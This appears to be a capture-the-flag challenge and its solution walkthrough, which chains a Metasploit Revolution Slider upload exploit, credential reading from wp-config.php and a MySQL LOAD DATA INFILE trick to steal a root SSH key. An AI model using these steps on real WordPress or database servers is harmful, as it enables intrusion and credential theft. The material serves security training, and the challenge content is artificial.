# Wordpress

I setup my own Wordpress site!

I love that there are so many plugins. My favorite is Revolution Slider. Even though it's a little old it doesn't show up on wpscan!

Please give it about 30 seconds after connecting for everything to setup correctly.

## Solution
1. Run `wpscan` on the wordpress website and find that it is using a vulnerable version of revslider
2. Setup metasploit and use the `exploit/unix/webapp/wp_revslider_upload_execute` exploit
3. Get a shell on the webserver
4. Read `note.txt` and `wp-config.php`
5. Use the creds to connect to the db server with mysql (`mysql -h <ip> -u wordpress -p`)
6. Read `/backup/id_rsa` off the db server by executing the following sql commands:
    - `use wordpress;`
    - `CREATE TABLE files (text VARCHAR(1024));`
    - `LOAD DATA INFILE '/backup/id_rsa' INTO TABLE files;`
    - `SELECT * FROM files;`
7. Copy `id_rsa` to local file
8. Use `id_rsa` to ssh into the webserver as root (`ssh -i id_rsa root@<ip>`)
9. Read `flag.txt`
    
